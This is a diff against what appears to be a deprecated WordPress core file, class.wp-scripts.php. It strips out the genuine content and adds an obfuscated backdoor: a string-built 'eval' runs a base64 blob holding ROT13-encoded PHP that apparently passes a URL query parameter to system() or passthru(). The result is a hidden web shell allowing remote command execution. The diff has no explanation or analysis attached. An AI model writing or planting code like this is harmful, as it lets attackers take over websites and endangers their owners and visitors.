@@ -1,24 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Dependencies API: WP_Scripts class
- *
- * This file is deprecated, use 'wp-includes/class-wp-scripts.php' instead.
- *
- * @deprecated 6.1.0
- * @package WordPress
- */
-
-_deprecated_file( basename( __FILE__ ), '6.1.0', WPINC . '/class-wp-scripts.php' );
-
-/** WP_Scripts class */
-require_once ABSPATH . WPINC . '/class-wp-scripts.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXJjcmFxcmFwdnJmIE5DVjogSkNfRnBldmNnZiBweW5mZgogKgogKiBHdXZmIHN2eXIgdmYgcXJjZXJwbmdycSwgaGZyICdqYy12YXB5aHFyZi9weW5mZi1qYy1mcGV2Y2dmLmN1YycgdmFmZ3JucS4KICoKICogQHFyY2VycG5ncnEgNi4xLjAKICogQGNucHhudHIgSmJlcUNlcmZmCiAqLwoKX3FyY2VycG5ncnFfc3Z5ciggb25mcmFuenIoIF9fU1ZZUl9fICksICc2LjEuMCcsIEpDVkFQIC4gJy9weW5mZi1qYy1mcGV2Y2dmLmN1YycgKTsKCi8qKiBKQ19GcGV2Y2dmIHB5bmZmICovCmVyZGh2ZXJfYmFwciBOT0ZDTkdVIC4gSkNWQVAgLiAnL3B5bmZmLWpjLWZwZXZjZ2YuY3VjJzsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
